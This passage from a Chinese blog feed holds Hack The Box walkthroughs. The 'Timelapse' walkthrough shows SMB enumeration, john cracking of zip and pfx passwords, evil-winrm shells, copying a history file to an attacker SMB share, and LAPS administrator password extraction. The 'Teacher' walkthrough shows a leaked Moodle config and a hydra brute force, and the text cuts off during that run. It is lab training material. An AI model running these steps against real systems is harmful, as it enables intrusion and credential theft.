lrrndm32+d0YeP/wb8E=<br>|_-----END CERTIFICATE-----<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-06-06T13:31:02+00:00; +7h59m59s from scanner time.<br>|_ssl-known-key: ERROR: Script execution failed (use -d to debug)<br>| tls-alpn: <br>|_  http/1.1<br>9389/tcp  open  mc-nmf            .NET Message Framing<br>49667/tcp open  msrpc             Microsoft Windows RPC<br>49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0<br>49674/tcp open  msrpc             Microsoft Windows RPC<br>49696/tcp open  msrpc             Microsoft Windows RPC<br>61126/tcp open  msrpc             Microsoft Windows RPC<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-06-06T13:30:22<br>|_  start_date: N/A<br>|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Mon Jun  6 13:31:07 2022 -- 1 IP address (1 host up) scanned in 455.87 seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.11.152 -u <span class="hljs-built_in">whoami</span><br>[+] Guest session   IP: 10.10.11.152:445Name: timelapse.htb                                     <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          NO ACCESSLogon server share <br>Shares                                            READ ONLY<br>SYSVOL                                            NO ACCESSLogon server share <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.11.152/Shares -U <span class="hljs-built_in">whoami</span> <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\<span class="hljs-built_in">whoami</span>]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Mon Oct 25 23:39:15 2021<br>  ..                                  D        0  Mon Oct 25 23:39:15 2021<br>  Dev                                 D        0  Tue Oct 26 03:40:06 2021<br>  HelpDesk                            D        0  Mon Oct 25 23:48:42 2021<br><br>6367231 blocks of size 4096. 2454832 blocks available<br>smb: \&gt; <span class="hljs-built_in">cd</span> Dev<br>smb: \Dev\&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Tue Oct 26 03:40:06 2021<br>  ..                                  D        0  Tue Oct 26 03:40:06 2021<br>  winrm_backup.zip                    A     2611  Mon Oct 25 23:46:42 2021<br><br>6367231 blocks of size 4096. 2454832 blocks available<br>smb: \Dev\&gt; get winrm_backup.zip <br>getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \Dev\&gt; <span class="hljs-built_in">cd</span> ..<br>smb: \&gt; <span class="hljs-built_in">cd</span> HelpDesk\<br>smb: \HelpDesk\&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Mon Oct 25 23:48:42 2021<br>  ..                                  D        0  Mon Oct 25 23:48:42 2021<br>  LAPS.x64.msi                        A  1118208  Mon Oct 25 22:57:50 2021<br>  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 22:57:46 2021<br>  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 22:57:40 2021<br>  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 22:57:44 2021<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220606134553208.png" alt="image-20220606134553208"></p><p>一份说明文档。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Tom<br>jiri<br></code></pre></td></tr></table></figure><p>winrm_backup.zip需要解码密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ zip2john winrm_backup.zip &gt; <span class="hljs-built_in">hash</span><br>$ john -w=/usr/share/wordlists/rockyou.txt <span class="hljs-built_in">hash</span> <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     <br>1g 0:00:00:00 DONE (2022-06-06 13:53) 3.846g/s 13359Kp/s 13359Kc/s 13359KC/s surkerior..superkebab<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>解出来的证书也需要密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ pfx2john legacyy_dev_auth.pfx &gt; pfx.hash<br>$ john -w=/usr/share/wordlists/rockyou.txt pfx.hash             <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (pfx, (.pfx, .p12) [PKCS<span class="hljs-comment">#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])</span><br>Cost 1 (iteration count) is 2000 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>thuglegacy       (legacyy_dev_auth.pfx)     <br>1g 0:00:00:59 DONE (2022-06-06 13:56) 0.01677g/s 54205p/s 54205c/s 54205C/s thuglife06..thsco04<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>但是直接用工具读取该证书还是需要密码，而工具不支持输入密码解密。使用不了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/<br></code></pre></td></tr></table></figure><p>以上博客讲述了如何从pfx证书中获取pkcs12的证书：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#从证书里输出key</span><br>$ openssl pkcs12 -<span class="hljs-keyword">in</span> legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes<br>Enter Import Password:<br><span class="hljs-comment">#从证书里输出证书</span><br>$ openssl pkcs12 -<span class="hljs-keyword">in</span> myfile.pfx -nokeys -out certificate.pem <br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -S -c certificate.pem -k priv-key.pem -i 10.10.11.152 <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Warning: SSL enabled<br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; copy ConsoleHost_history.txt \\10.10.16.8\share<br>*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> ConsoleHost_history.txt <br><span class="hljs-built_in">whoami</span><br>ipconfig /all<br>netstat -ano |select-string LIST<br><span class="hljs-variable">$so</span> = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<br><span class="hljs-variable">$p</span> = ConvertTo-SecureString <span class="hljs-string">&#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27;</span> -AsPlainText -Force<br><span class="hljs-variable">$c</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;svc_deploy&#x27;</span>, <span class="hljs-variable">$p</span>)<br>invoke-command -computername localhost -credential <span class="hljs-variable">$c</span> -port 5986 -usessl -SessionOption <span class="hljs-variable">$so</span> -scriptblock &#123;<span class="hljs-built_in">whoami</span>&#125;<br>get-aduser -filter * -properties *<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><p>照着命令敲一遍：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\legacyy&gt; <span class="hljs-variable">$so</span> = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<br>*Evil-WinRM* PS C:\Users\legacyy&gt; <span class="hljs-variable">$p</span> = ConvertTo-SecureString <span class="hljs-string">&#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27;</span> -AsPlainText -Force<br>*Evil-WinRM* PS C:\Users\legacyy&gt; <span class="hljs-variable">$c</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;svc_deploy&#x27;</span>, <span class="hljs-variable">$p</span>)<br>*Evil-WinRM* PS C:\Users\legacyy&gt; invoke-command -computername localhost -credential <span class="hljs-variable">$c</span> -port 5986 -usessl -SessionOption <span class="hljs-variable">$so</span> -scriptblock &#123;<span class="hljs-built_in">whoami</span>&#125;<br>timelapse\svc_deploy<br>*Evil-WinRM* PS C:\Users\legacyy&gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\legacyy&gt; net user svc_deploy<br>User name                    svc_deploy<br>Full Name                    svc_deploy<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            10/25/2021 12:12:37 PM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          10/26/2021 12:12:37 PM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   6/6/2022 8:18:09 AM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Remote Management Use</span><br><span class="hljs-string">Global Group memberships     *LAPS_Readers         *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br></code></pre></td></tr></table></figure><p>LAPS_Readers组，或许它能够读取LAPS中的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\legacyy&gt; invoke-command -computername localhost -credential <span class="hljs-variable">$c</span> -port 5986 -usessl -SessionOption <span class="hljs-variable">$so</span> -scriptblock &#123;Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime&#125;<br><br><br>PSComputerName              : localhost<br>RunspaceId                  : a093c85b-e854-4810-8987-3058483225c6<br>DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb<br>DNSHostName                 : dc01.timelapse.htb<br>Enabled                     : True<br>ms-Mcs-AdmPwd               : 7kZ1f49+gt0.CD(422(4+s&#125;2<br>ms-Mcs-AdmPwdExpirationTime : 132993481476264594<br>Name                        : DC01<br>ObjectClass                 : computer<br>ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f<br>SamAccountName              : DC01$<br>SID                         : S-1-5-21-671920749-559770252-3318990721-1000<br>UserPrincipalName           :<br><br>PSComputerName    : localhost<br>RunspaceId        : a093c85b-e854-4810-8987-3058483225c6<br>DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb<br>DNSHostName       :<br>Enabled           : True<br>Name              : DB01<br>ObjectClass       : computer<br>ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d<br>SamAccountName    : DB01$<br>SID               : S-1-5-21-671920749-559770252-3318990721-1606<br>UserPrincipalName :<br><br>PSComputerName    : localhost<br>RunspaceId        : a093c85b-e854-4810-8987-3058483225c6<br>DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb<br>DNSHostName       :<br>Enabled           : True<br>Name              : WEB01<br>ObjectClass       : computer<br>ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683<br>SamAccountName    : WEB01$<br>SID               : S-1-5-21-671920749-559770252-3318990721-1607<br>UserPrincipalName :<br><br>PSComputerName    : localhost<br>RunspaceId        : a093c85b-e854-4810-8987-3058483225c6<br>DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb<br>DNSHostName       :<br>Enabled           : True<br>Name              : DEV01<br>ObjectClass       : computer<br>ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca<br>SamAccountName    : DEV01$<br>SID               : S-1-5-21-671920749-559770252-3318990721-1608<br>UserPrincipalName :<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -u Administrator -p <span class="hljs-string">&#x27;7kZ1f49+gt0.CD(422(4+s&#125;2&#x27;</span> -i 10.10.11.152 -S<br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Warning: SSL enabled<br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Teacher</title>
    <link href="/post/HackTheBox-Teacher.html"/>
    <url>/post/HackTheBox-Teacher.html</url>
    
    <content type="html"><![CDATA[<p>先介绍一个估计也困扰很多同僚好久但无法解决问题的一个解决方案，这技巧也是我最近才从某位师傅口中了解得知。就是在每次获取的VPN文件中添加一行自己的代理地址.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socks-proxy127.0.0.1 7890<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821192201834.png" alt="image-20220821192201834"  /><p>网络环境会有明显的改观。</p><p>我抛弃Windows已经很久了，现在应该算是一个标准的linux用户，记录靶机WP一方面是为了锻炼自身的熟练度，二方面是为了填充博客空虚的文章空间，三是为了配合相关的学习计划，以及无形之中培养的文档写作能力。用了段时间linux发现是真的香：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821193228140.png" alt="image-20220821193228140"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Teacher.png"></p><p>介于网络环境延迟虽然还是会有些许波动，但是大体环境还是挺稳定的:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ ping 10.10.10.153                                                                                              <br>PING 10.10.10.153 (10.10.10.153) 56(84) bytes of data.<br>64 bytes from 10.10.10.153: icmp_seq=1 ttl=63 time=103 ms<br>64 bytes from 10.10.10.153: icmp_seq=2 ttl=63 time=149 ms<br>64 bytes from 10.10.10.153: icmp_seq=3 ttl=63 time=272 ms<br>64 bytes from 10.10.10.153: icmp_seq=4 ttl=63 time=99.1 ms<br>64 bytes from 10.10.10.153: icmp_seq=5 ttl=63 time=114 ms<br>64 bytes from 10.10.10.153: icmp_seq=6 ttl=63 time=99.4 ms<br>64 bytes from 10.10.10.153: icmp_seq=7 ttl=63 time=96.3 ms<br></code></pre></td></tr></table></figure><p>可以masscan进行扫描，漏扫的情况会少很多：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/Teacher$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.153<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-21 11:17:16 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.10.153        <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821193442384.png" alt="image-20220821193442384"></p><p>默认页面是一个特别假的页面，很多按钮是都无法与之交互的。基本信息也是没有什么的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -I http://teacher.htb/                            <br>HTTP/1.1 200 OK<br>Date: Sun, 21 Aug 2022 11:35:10 GMT<br>Server: Apache/2.4.25 (Debian)<br>Last-Modified: Wed, 27 Jun 2018 02:53:22 GMT<br>ETag: <span class="hljs-string">&quot;1f5c-56f96b7bed26f&quot;</span><br>Accept-Ranges: bytes<br>Content-Length: 8028<br>Vary: Accept-Encoding<br>Content-Type: text/html<br></code></pre></td></tr></table></figure><p>然后我用了一款新工具<a img src="https://www.kali.org/tools/skipfish/">skipfish</a>对目录进行枚举，中途感觉爬的差不多可以手动ctrl C 停止，该工具会将结果转换为可视化的html页面：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821194427859.png" alt="image-20220821194427859"></p><p>它有将一张5.png的图片当成一个文本。我也觉得有趣，但是这图片是访问不了的：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821194516964.png" alt="image-20220821194516964"></p><p>可能本身就是一个txt文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ wget http://teacher.htb/images/5.png                        <br>--2022-08-21 19:45:49--  http://teacher.htb/images/5.png<br>正在解析主机 teacher.htb (teacher.htb)... 10.10.10.153<br>正在连接 teacher.htb (teacher.htb)|10.10.10.153|:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：200 [image/png]<br>正在保存至: “5.png.1”<br><br>5.png.1                                                              100%[===================================================================================================================================================================&gt;]     200  --.-KB/s  用时 0s      <br><br>2022-08-21 19:45:49 (12.6 MB/s) - 已保存 “5.png.1” [200/200])<br><br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ <span class="hljs-built_in">cat</span> 5.png <br>Hi Servicedesk,<br><br>I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.<br><br>Could you guys figure out what the last charachter is, or just reset it?<br><br>Thanks,<br>Giovanni<br></code></pre></td></tr></table></figure><p>一个用户名：Giovanni。一个密码字符串：Th4C00lTheacha，没有最后一位。紧接着还有一个 moodle 目录。应该是靶机的主题：<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821194853327.png" alt="image-20220821194853327"></p><p>这个目录还伴随着大量的目录遍历文件泄露：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://teacher.htb/moodle/config.php.save  <br>&lt;?php  // Moodle configuration file<br><br><span class="hljs-built_in">unset</span>(<span class="hljs-variable">$CFG</span>);<br>global <span class="hljs-variable">$CFG</span>;<br><span class="hljs-variable">$CFG</span> = new stdClass();<br><br><span class="hljs-variable">$CFG</span>-&gt;dbtype    = <span class="hljs-string">&#x27;mariadb&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dblibrary = <span class="hljs-string">&#x27;native&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbhost    = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbname    = <span class="hljs-string">&#x27;moodle&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbuser    = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dbpass    = <span class="hljs-string">&#x27;Welkom1!&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;prefix    = <span class="hljs-string">&#x27;mdl_&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;dboptions = array (<br>  <span class="hljs-string">&#x27;dbpersist&#x27;</span> =&gt; 0,<br>  <span class="hljs-string">&#x27;dbport&#x27;</span> =&gt; 3306,<br>  <span class="hljs-string">&#x27;dbsocket&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;dbcollation&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8mb4_unicode_ci&#x27;</span>,<br>);<br><br><span class="hljs-variable">$CFG</span>-&gt;wwwroot   = <span class="hljs-string">&#x27;http://10.10.10.153/moodle&#x27;</span>; // CHANGE THIS - Gi<span class="hljs-variable">$CFG</span>-&gt;dataroot  = <span class="hljs-string">&#x27;/var/www/moodledata&#x27;</span>;<br><span class="hljs-variable">$CFG</span>-&gt;admin     = <span class="hljs-string">&#x27;admin&#x27;</span>;<br><br><span class="hljs-variable">$CFG</span>-&gt;directorypermissions = 0777;<br><br>require_once(__DIR__ . <span class="hljs-string">&#x27;/lib/setup.php&#x27;</span>);<br><br>// There is no php closing tag <span class="hljs-keyword">in</span> this file,<br>// it is intentional because it prevents trailing whitespace problems!<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220821195201690.png" alt="image-20220821195201690"></p><p>登录框可以根据用户名Giovanni去尝试爆破，因为他自己说了他只是忘了最后一位：Th4C00lTheacha，可以用python快速生成，或者burp都行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&#x27;import string;print(&quot;\n&quot;.join([f&quot;Th4C00lTheacha&#123;c&#125;&quot; for c in string.printable[:-5]]))&#x27;</span> &gt; passwords<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ hydra -l Giovanni -P passwords 10.10.10.153 http-post-form <span class="hljs-string">&quot;/moodle/login/index.php:anchor=&amp;username=^USER^&amp;password=^PASS^&amp;rememberusername=1:Invalid login&quot;</span><br>Hydra v9.3 